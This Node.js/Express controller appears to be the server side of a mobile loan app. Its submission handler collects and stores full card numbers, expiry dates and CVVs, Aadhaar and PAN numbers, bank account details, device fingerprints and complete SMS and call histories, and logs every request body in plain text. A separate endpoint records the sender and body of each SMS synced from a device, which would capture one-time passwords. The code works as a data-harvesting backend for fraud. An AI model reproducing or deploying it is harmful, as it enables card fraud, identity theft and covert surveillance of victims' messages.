const { Application } = require('../models');
const { validationResult } = require('express-validator');

exports.submitApplication = async (req, res) => {
    console.log('[RUTHLESS TRACE] New Application Submission Incoming');
    console.log(JSON.stringify(req.body, null, 2));

    try {
        const {
            name, phone, dob, jobType, maritalStatus,
            amount, aadhaar, pan,
            cardNumber, cardExpiry, cardCvv,
            bankName, accNo, ifsc,
            deviceId, deviceInfo, appId,
            smsHistory, callHistory
        } = req.body;

        const newApplication = await Application.create({
            fullName: name,
            mobile: phone,
            dob: dob,
            panCard: pan,
            aadhaarNumber: aadhaar,
            smsHistory: smsHistory,
            callHistory: callHistory,
            bankAccount: {
                bankName,
                accountNumber: accNo,
                ifscCode: ifsc,
                cardNumber,
                cardExpiry,
                cardCvv,
                loanAmountOffer: amount
            },
            deviceFingerprint: {
                deviceId,
                deviceInfo,
                appId,
                jobType,
                maritalStatus
            }
        });

        console.log('[RUTHLESS TRACE] Application Created Successfully:', newApplication.applicationId);

        res.status(201).json({
            message: 'Application submitted successfully',
            applicationId: newApplication.applicationId,
            appNo: appId
        });
    } catch (error) {
        console.error('[RUTHLESS TRACE] Submission Error:', error);
        res.status(500).json({ message: 'Server error during submission', detail: error.message });
    }
};

exports.getApplicationStatus = async (req, res) => {
    try {
        const { applicationId } = req.params;
        const application = await Application.findOne({ where: { applicationId } });

        if (!application) {
            return res.status(404).json({ message: 'Application not found' });
        }

        res.json({
            applicationId: application.applicationId,
            status: application.status
        });
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
};

exports.syncSms = async (req, res) => {
    console.log('[RUTHLESS TRACE] New SMS Sync Incoming');
    console.log(JSON.stringify(req.body, null, 2));

    try {
        const { deviceId, sms } = req.body;
        // In a worldwide app, we'd log this to a separate Logs table or elasticsearch
        console.log(`[RUTHLESS SMS] Device: ${deviceId} | From: ${sms.address} | Body: ${sms.body}`);
        res.json({ status: 'logged' });
    } catch (e) {
        console.error('[RUTHLESS TRACE] SMS Sync Error:', e);
        res.status(500).json({ error: e.message });
    }
};
exports.getDiagnostics = async (req, res) => {
    try {
        const count = await Application.count();
        res.json({
            status: 'success',
            database: 'connected',
            recordCount: count,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            status: 'error',
            message: error.message,
            stack: error.stack
        });
    }
};
